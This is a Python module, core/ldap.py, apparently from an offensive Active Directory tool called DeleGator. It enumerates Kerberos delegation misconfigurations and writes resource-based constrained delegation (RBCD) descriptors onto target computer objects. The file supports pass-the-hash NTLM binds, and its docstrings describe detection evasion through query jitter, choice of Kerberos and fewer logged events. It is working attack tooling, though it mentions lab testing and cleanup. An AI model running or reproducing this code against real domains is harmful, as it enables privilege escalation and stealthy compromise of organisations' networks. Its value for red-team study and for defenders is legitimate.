"""
core/ldap.py

LDAP connection management and query primitives for DeleGator.

OPSEC design principles:
  - Kerberos authentication is preferred over NTLM. NTLM auth against
    LDAP generates additional events and is increasingly flagged by
    modern detection rules. Kerberos is used wherever the auth context
    supports it and NTLM is an explicit fallback only.

  - All queries use targeted LDAP filters. No broad (objectClass=*)
    style dumps that pull the entire directory and generate high
    Event ID 4662 volume. Every filter is scoped to exactly the
    attributes needed for that query.

  - Queries are issued through a single rate-limited method that
    applies configurable delay and jitter between requests. This
    keeps query timing within the range of normal LDAP traffic
    patterns rather than machine-speed enumeration.

  - Search bases are scoped to the minimum required container where
    possible (e.g. CN=Computers rather than the full DC root) to
    reduce the breadth of directory access events generated.
"""

import sys
import time
import random
import ssl
from typing import Optional, Generator, Any

import ldap3
from ldap3 import (
    Server, Connection, NTLM, KERBEROS, SASL,
    SUBTREE, ALL_ATTRIBUTES, SIMPLE, AUTO_BIND_NO_TLS,
    Tls
)
from ldap3.core.exceptions import (
    LDAPBindError,
    LDAPSocketOpenError,
    LDAPSocketReceiveError,
    LDAPOperationResult,
    LDAPException,
)

from .auth import AuthContext, AuthMethod


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# Default LDAP attributes we pull for delegation enumeration.
# Keeping this list tight reduces response size and event noise.
DELEGATION_ATTRS = [
    "sAMAccountName",
    "distinguishedName",
    "objectClass",
    "userAccountControl",
    "msDS-AllowedToDelegateTo",
    "msDS-AllowedToActOnBehalfOfOtherIdentity",
    "servicePrincipalName",
    "pwdLastSet",
    "lastLogonTimestamp",
    "operatingSystem",
]

ACL_ATTRS = [
    "sAMAccountName",
    "distinguishedName",
    "nTSecurityDescriptor",
    "objectClass",
]

COMPUTER_ATTRS = [
    "sAMAccountName",
    "distinguishedName",
    "userAccountControl",
    "operatingSystem",
    "operatingSystemVersion",
    "lastLogonTimestamp",
    "servicePrincipalName",
    "msDS-AllowedToDelegateTo",
    "msDS-AllowedToActOnBehalfOfOtherIdentity",
]

USER_ATTRS = [
    "sAMAccountName",
    "distinguishedName",
    "userAccountControl",
    "servicePrincipalName",
    "msDS-AllowedToDelegateTo",
    "pwdLastSet",
    "memberOf",
]


# ---------------------------------------------------------------------------
# OpsecConfig — controls query timing behaviour
# ---------------------------------------------------------------------------

class OpsecConfig:
    """
    Controls timing and noise behaviour for LDAP queries.

    delay_ms:   Base delay between queries in milliseconds.
                Default 0 (no delay) for speed during development.
                Set to 500-2000ms for production OPSEC use.

    jitter_pct: Percentage of delay_ms to randomise by.
                e.g. delay=1000, jitter=20 means each delay is
                between 800ms and 1200ms. Prevents rhythmic query
                patterns that statistical detection can fingerprint.

    slow:       Preset that sets delay=2000, jitter=30. Mimics
                the query cadence of legitimate AD management tools.
    """

    def __init__(
        self,
        delay_ms:   int  = 0,
        jitter_pct: int  = 0,
        slow:       bool = False,
    ):
        if slow:
            self.delay_ms   = 2000
            self.jitter_pct = 30
        else:
            self.delay_ms   = delay_ms
            self.jitter_pct = max(0, min(jitter_pct, 100))

    def sleep(self) -> None:
        """Sleep for delay_ms +/- jitter before the next query."""
        if self.delay_ms == 0:
            return
        jitter_range = int(self.delay_ms * (self.jitter_pct / 100))
        actual_delay = self.delay_ms + random.randint(-jitter_range, jitter_range)
        time.sleep(max(0, actual_delay) / 1000.0)

    def __repr__(self) -> str:
        return (
            f"OpsecConfig(delay={self.delay_ms}ms, "
            f"jitter={self.jitter_pct}%)"
        )


# ---------------------------------------------------------------------------
# LDAPConnection — wraps ldap3 and exposes query primitives
# ---------------------------------------------------------------------------

class LDAPConnection:
    """
    Manages a single authenticated LDAP connection to a domain controller.

    Consumers should use the factory function `connect()` rather than
    instantiating this class directly.
    """

    def __init__(
        self,
        conn:        Connection,
        base_dn:     str,
        domain:      str,
        dc_ip:       str,
        opsec:       OpsecConfig,
    ):
        self._conn   = conn
        self.base_dn = base_dn
        self.domain  = domain
        self.dc_ip   = dc_ip
        self.opsec   = opsec

    # ------------------------------------------------------------------
    # Internal query method — all public query methods funnel through here
    # ------------------------------------------------------------------

    def _query(
        self,
        search_filter: str,
        attributes:    list[str],
        search_base:   Optional[str] = None,
        scope:         Any           = SUBTREE,
    ) -> list[dict]:
        """
        Execute a single LDAP query and return a list of entry dicts.

        Applies opsec delay before each query. Uses the provided
        search_base or falls back to the domain root base_dn.
        Exits cleanly on LDAP errors rather than throwing exceptions
        up to the caller.
        """
        self.opsec.sleep()

        base = search_base or self.base_dn

        try:
            self._conn.search(
                search_base=base,
                search_filter=search_filter,
                search_scope=scope,
                attributes=attributes,
            )
        except LDAPOperationResult as e:
            _die(f"LDAP query failed: {e}")
        except LDAPSocketReceiveError as e:
            _die(f"LDAP connection lost mid-query: {e}")
        except LDAPException as e:
            _die(f"Unexpected LDAP error: {e}")

        results = []
        for entry in self._conn.entries:
            entry_dict = {"dn": entry.entry_dn}
            for attr in attributes:
                try:
                    val = entry[attr].value
                    entry_dict[attr] = val
                except Exception:
                    entry_dict[attr] = None
            results.append(entry_dict)

        return results

    # ------------------------------------------------------------------
    # Domain metadata
    # ------------------------------------------------------------------

    def get_domain_info(self) -> dict:
        """
        Pull basic domain metadata from server info collected at
        connection time (get_info=ldap3.ALL). No additional query
        needed so this generates zero extra log noise.
        """
        try:
            info = self._conn.server.info
            if not info:
                return {}

            def _first(val):
                if val is None:
                    return ""
                if isinstance(val, (list, tuple)):
                    return str(val[0]) if val else ""
                return str(val)

            return {
                "base_dn":              _first(info.other.get("defaultNamingContext")),
                "domain_functionality": _first(info.other.get("domainFunctionality")),
                "forest_functionality": _first(info.other.get("forestFunctionality")),
                "dc_hostname":          _first(info.other.get("dnsHostName")),
            }
        except Exception:
            return {}

    # ------------------------------------------------------------------
    # Delegation enumeration queries
    # ------------------------------------------------------------------

    def get_unconstrained_computers(self) -> list[dict]:
        """
        Find computer accounts with unconstrained delegation configured.

        Filter explanation:
          (&
            (objectCategory=computer)          only computer objects
            (userAccountControl:1.2.840...=524288)  TRUSTED_FOR_DELEGATION flag
            (!(userAccountControl:1.2.840...=8192))  exclude DCs (SERVER_TRUST_ACCOUNT)
          )

        Excluding DCs is important — they legitimately have this flag set
        and including them would generate false positives in the output.
        The OID 1.2.840.113556.1.4.803 is the LDAP_MATCHING_RULE_BIT_AND
        operator used to test individual bits in userAccountControl.
        """
        # TRUSTED_FOR_DELEGATION = 0x80000 = 524288
        # SERVER_TRUST_ACCOUNT   = 0x2000  = 8192 (domain controllers)
        search_filter = (
            "(&"
            "(objectCategory=computer)"
            "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
            "(!(userAccountControl:1.2.840.113556.1.4.803:=8192))"
            ")"
        )
        return self._query(search_filter, COMPUTER_ATTRS)

    def get_constrained_accounts(self) -> list[dict]:
        """
        Find accounts (users and computers) with constrained delegation
        configured via msDS-AllowedToDelegateTo.

        Returns both user and computer accounts since constrained
        delegation can be configured on either object type.
        """
        search_filter = (
            "(&"
            "(|(objectCategory=user)(objectCategory=computer))"
            "(msDS-AllowedToDelegateTo=*)"
            ")"
        )
        return self._query(search_filter, DELEGATION_ATTRS)

    def get_rbcd_configured(self) -> list[dict]:
        """
        Find computer accounts that already have RBCD configured,
        i.e. msDS-AllowedToActOnBehalfOfOtherIdentity is populated.

        This covers cases where RBCD has already been set by an admin
        or by a previous attacker — both worth surfacing in the output.
        """
        search_filter = (
            "(&"
            "(objectCategory=computer)"
            "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
            ")"
        )
        return self._query(search_filter, COMPUTER_ATTRS)

    def get_protocol_transition_accounts(self) -> list[dict]:
        """
        Find accounts with both constrained delegation AND protocol
        transition enabled (TRUSTED_TO_AUTH_FOR_DELEGATION flag).

        This is the most exploitable constrained delegation variant
        since it allows S4U2Self without needing the target user's TGT.
        TRUSTED_TO_AUTH_FOR_DELEGATION = 0x1000000 = 16777216
        """
        search_filter = (
            "(&"
            "(|(objectCategory=user)(objectCategory=computer))"
            "(msDS-AllowedToDelegateTo=*)"
            "(userAccountControl:1.2.840.113556.1.4.803:=16777216)"
            ")"
        )
        return self._query(search_filter, DELEGATION_ATTRS)

    # ------------------------------------------------------------------
    # ACL / write permission queries (for RBCD setup path)
    # ------------------------------------------------------------------

    def get_computers_writable_by(self, account_sid: str) -> list[dict]:
        """
        Find computer objects where the specified account SID has
        write permissions that could be used to configure RBCD.

        This query pulls nTSecurityDescriptor which requires the
        account to have read access to ACLs. The descriptor is
        parsed by the enumeration module to find GenericWrite,
        WriteDacl, and WriteOwner permissions.

        Note: This is a more expensive query than the delegation
        attribute queries and generates more LDAP traffic. It is
        only invoked when --check-rbcd-paths is specified.
        """
        search_filter = "(objectCategory=computer)"
        return self._query(
            search_filter,
            ACL_ATTRS + ["sAMAccountName", "distinguishedName"],
            search_base=f"CN=Computers,{self.base_dn}",
        )

    def get_account_by_samname(self, samname: str) -> Optional[dict]:
        """
        Look up a single account by sAMAccountName.
        Used to resolve account details when building attack path output.
        """
        search_filter = f"(sAMAccountName={samname})"
        results = self._query(search_filter, USER_ATTRS + COMPUTER_ATTRS)
        return results[0] if results else None

    def get_account_sid(self, samname: str) -> Optional[str]:
        """
        Return the objectSid for an account as a string.
        Used when building the RBCD security descriptor.
        """
        search_filter = f"(sAMAccountName={samname})"
        results = self._query(search_filter, ["objectSid", "sAMAccountName"])
        if not results:
            return None
        sid = results[0].get("objectSid")
        return str(sid) if sid else None

    def get_domain_controllers(self) -> list[dict]:
        """
        Return all domain controller computer accounts.
        Used to exclude DCs from unconstrained delegation results
        and to identify high-value delegation targets.
        SERVER_TRUST_ACCOUNT = 0x2000 = 8192
        """
        search_filter = (
            "(&"
            "(objectCategory=computer)"
            "(userAccountControl:1.2.840.113556.1.4.803:=8192)"
            ")"
        )
        return self._query(search_filter, COMPUTER_ATTRS)

    # ------------------------------------------------------------------
    # Write operations (used by exploitation modules)
    # ------------------------------------------------------------------

    def write_rbcd(self, target_dn: str, security_descriptor: bytes) -> bool:
        """
        Write a security descriptor to msDS-AllowedToActOnBehalfOfOtherIdentity
        on the target computer object to configure RBCD.

        Returns True on success, exits on failure.
        This operation generates Event ID 5136 (directory service object
        modified) on the DC which is the primary RBCD detection event.
        """
        self.opsec.sleep()

        try:
            self._conn.modify(
                target_dn,
                {
                    "msDS-AllowedToActOnBehalfOfOtherIdentity": [
                        (ldap3.MODIFY_REPLACE, [security_descriptor])
                    ]
                },
            )
        except LDAPException as e:
            _die(f"Failed to write RBCD attribute to '{target_dn}': {e}")

        if self._conn.result["result"] == 0:
            return True

        result_desc = self._conn.result.get("description", "unknown error")
        _die(
            f"LDAP modify failed for '{target_dn}': {result_desc}\n"
            "  This usually means the authenticated account lacks "
            "write access to the target computer object."
        )

    def clear_rbcd(self, target_dn: str) -> bool:
        """
        Remove msDS-AllowedToActOnBehalfOfOtherIdentity from a computer object.
        Used to clean up after exploitation during testing.
        """
        self.opsec.sleep()

        try:
            self._conn.modify(
                target_dn,
                {
                    "msDS-AllowedToActOnBehalfOfOtherIdentity": [
                        (ldap3.MODIFY_DELETE, [])
                    ]
                },
            )
        except LDAPException as e:
            _die(f"Failed to clear RBCD attribute on '{target_dn}': {e}")

        return self._conn.result["result"] == 0

    # ------------------------------------------------------------------
    # Utility
    # ------------------------------------------------------------------

    def domain_to_base_dn(self) -> str:
        """Return the current base DN."""
        return self.base_dn

    def close(self) -> None:
        """Cleanly close the LDAP connection."""
        try:
            self._conn.unbind()
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

def _die(message: str) -> None:
    print(f"\n  [!] LDAP error: {message}\n", file=sys.stderr)
    sys.exit(1)


def _domain_to_base_dn(domain: str) -> str:
    """Convert delegator.lab to DC=delegator,DC=lab"""
    parts = domain.lower().strip(".").split(".")
    return ",".join(f"DC={part}" for part in parts)


def _build_server(dc_ip: str, use_ssl: bool = False) -> Server:
    """
    Build an ldap3 Server object.
    SSL is optional — most internal AD environments don't require LDAPS
    and forcing it adds complexity without OPSEC benefit in a lab context.
    Port 636 for LDAPS, 389 for plain LDAP.
    """
    port = 636 if use_ssl else 389

    if use_ssl:
        tls = Tls(validate=ssl.CERT_NONE)
        return Server(dc_ip, port=port, use_ssl=True, tls=tls, get_info=ldap3.ALL)

    return Server(dc_ip, port=port, get_info=ldap3.ALL)


def _bind_ntlm(
    server:   Server,
    auth:     AuthContext,
    domain:   str,
) -> Connection:
    """
    Establish an NTLM-authenticated LDAP bind.
    Used as fallback when Kerberos is not available.
    """
    ntlm_user = f"{domain.upper()}\\{auth.username}"

    if auth.auth_method.name == "HASH":
        # Pass-the-hash: construct the password string Impacket/ldap3 expects
        password = f"{auth.lm_hash}:{auth.nt_hash}"
    else:
        password = auth.password or ""

    conn = Connection(
        server,
        user=ntlm_user,
        password=password,
        authentication=NTLM,
        auto_bind=AUTO_BIND_NO_TLS,
    )

    if not conn.bind():
        result = conn.result.get("description", "unknown")
        _die(
            f"NTLM LDAP bind failed for '{ntlm_user}': {result}\n"
            "  Check credentials and that the account is not locked."
        )

    return conn


def _bind_simple(
    server:   Server,
    auth:     AuthContext,
    base_dn:  str,
) -> Connection:
    """
    Simple bind using UPN format.
    Less preferred than NTLM or Kerberos but included as a fallback.
    """
    conn = Connection(
        server,
        user=auth.upn,
        password=auth.password or "",
        authentication=SIMPLE,
        auto_bind=AUTO_BIND_NO_TLS,
    )

    if not conn.bind():
        result = conn.result.get("description", "unknown")
        _die(
            f"Simple LDAP bind failed for '{auth.upn}': {result}\n"
            "  Check credentials and domain reachability."
        )

    return conn


# ---------------------------------------------------------------------------
# Public factory function
# ---------------------------------------------------------------------------

def connect(
    auth:       AuthContext,
    dc_ip:      str,
    domain:     Optional[str] = None,
    use_ssl:    bool          = False,
    opsec:      Optional[OpsecConfig] = None,
) -> LDAPConnection:
    """
    Establish an authenticated LDAP connection to a domain controller
    and return an LDAPConnection ready for queries.

    Authentication preference order:
      1. Kerberos (ccache or cert) — lowest noise, preferred
      2. NTLM hash — pass-the-hash, moderate noise
      3. NTLM password — standard, moderate noise
      4. Simple bind — highest noise, last resort

    Args:
        auth:    AuthContext from core/auth.py
        dc_ip:   IP address or hostname of the domain controller
        domain:  Domain FQDN. Defaults to auth.domain if not provided.
        use_ssl: Connect on port 636 with LDAPS. Default False.
        opsec:   OpsecConfig controlling query timing. Default no delay.

    Returns:
        LDAPConnection ready for queries.
    """
    resolved_domain = (domain or auth.domain).lower()
    base_dn = _domain_to_base_dn(resolved_domain)
    opsec   = opsec or OpsecConfig()
    server  = _build_server(dc_ip, use_ssl)

    auth_method = auth.auth_method.name

    # Kerberos authentication (ccache or certificate)
    if auth_method in ("CCACHE", "CERT"):
        if auth_method == "CCACHE":
            import os
            # Point Kerberos library at the ccache
            os.environ["KRB5CCNAME"] = auth.ccache_path

        try:
            conn = Connection(
                server,
                user=auth.upn,
                authentication=SASL,
                sasl_mechanism=KERBEROS,
                auto_bind=AUTO_BIND_NO_TLS,
            )
            if not conn.bind():
                result = conn.result.get("description", "unknown")
                _die(
                    f"Kerberos LDAP bind failed for '{auth.upn}': {result}\n"
                    "  Ensure the ticket is valid and has not expired.\n"
                    "  Try: klist to inspect the current ccache."
                )
        except LDAPSocketOpenError:
            _die(
                f"Cannot reach domain controller at {dc_ip}:{636 if use_ssl else 389}.\n"
                "  Check the IP is correct and the host is reachable."
            )
        except LDAPException as e:
            _die(f"Kerberos LDAP connection failed: {e}")

    # NTLM hash or password authentication
    elif auth_method in ("HASH", "PASSWORD"):
        try:
            conn = _bind_ntlm(server, auth, resolved_domain)
        except LDAPSocketOpenError:
            _die(
                f"Cannot reach domain controller at {dc_ip}:{636 if use_ssl else 389}.\n"
                "  Check the IP is correct and the host is reachable."
            )

    else:
        _die(f"Unsupported auth method for LDAP: {auth_method}")

    return LDAPConnection(
        conn=conn,
        base_dn=base_dn,
        domain=resolved_domain,
        dc_ip=dc_ip,
        opsec=opsec,
    )
